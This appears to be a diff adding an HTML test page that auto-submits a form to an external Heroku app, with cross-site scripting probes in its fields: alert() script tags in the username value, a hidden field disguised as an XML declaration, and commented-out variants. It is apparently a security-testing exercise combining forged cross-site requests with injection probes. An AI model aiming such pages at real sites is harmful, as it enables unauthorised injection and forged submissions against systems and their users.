@@ -1,0 +1,65 @@
+<html> 
+	
+	<head>
+		<meta charset="utf-8"/>
+
+		<!-- functions javascript -->
+		<script type="text/javascript">
+
+			// source : http://webdesignfromscratch.com/html-css/js101/
+			// hello world alert 
+			// function helloWorld () { 
+			//	alert("Hello World!"); 
+			// }
+
+			// source : https://stackoverflow.com/questions/30772779/opening-link-in-new-tab-without-clicking-on-link
+
+			// open webpage, [page] in new window 
+			//function OpenInNewTab(url) { 
+
+			//	var win = window.open(url, '_blank'); 
+			//	win.focus(); 
+
+			// }
+
+			// submit form with ID, id 
+			function submitForm(ID) { 
+
+				document.getElementById(ID).submit(); 
+
+			}
+
+			// dynamically create form... https://stackoverflow.com/questions/6964927/how-to-create-a-form-dynamically-via-javascript
+
+
+		</script>
+
+
+	</head>
+
+	<body>
+
+		<form id = login_form name = login_form action = http://http://pseg.herokuapp.com/ method = "post"> 
+			<!-- <input name = "username" id = "<script> alert('injection attempt') </script>" value = "attacker"> --> 
+			<!-- <input name = "password" id = "password" value = "pr1nc3t0n <script> alert("testing injection"); <script>"> --> 	
+
+			<input name = "username" id = "username" value = "<script> alert(1) </script>"> 
+			<input name = "password" id = "password" value = "testcreatepassword"> 
+
+			<input type="hidden" name='<?xml version' value='"1.0"?><query><script>alert(/XSS/)</script></query>'>
+<!--			<input name = "inject" value = "<script> document.title = "new title" </script> "> --> 
+
+		</form>
+
+		<script>
+			 submitForm("login_form"); 
+			// document.login_form.submit(); 
+			// document.getElementById(login_form).submit(); 
+		</script>
+
+
+	</body>
+
+
+
+</html>
